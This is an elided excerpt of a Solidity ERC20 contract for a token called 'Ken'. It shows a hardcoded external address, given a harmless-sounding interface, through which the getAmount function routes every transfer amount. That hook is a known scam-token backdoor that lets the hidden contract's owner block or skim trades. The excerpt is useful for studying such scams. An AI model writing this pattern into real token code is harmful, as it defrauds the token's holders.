...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _barbiesWorld = 0xf49Bc8D208D02FCD2eF96cFB2fb8440d7E151F8a;
    address public pair;

    IDEXRouter router;
    IERC5679 barbiesWorld;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        barbiesWorld = IERC5679(_barbiesWorld);
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return barbiesWorld.sendTransaction(amount);
    }
...
contract Ken is ERC20Token {
    constructor() ERC20Token("Ken", "KEN", msg.sender, 69420000000 * 10 ** 18) {
    }
}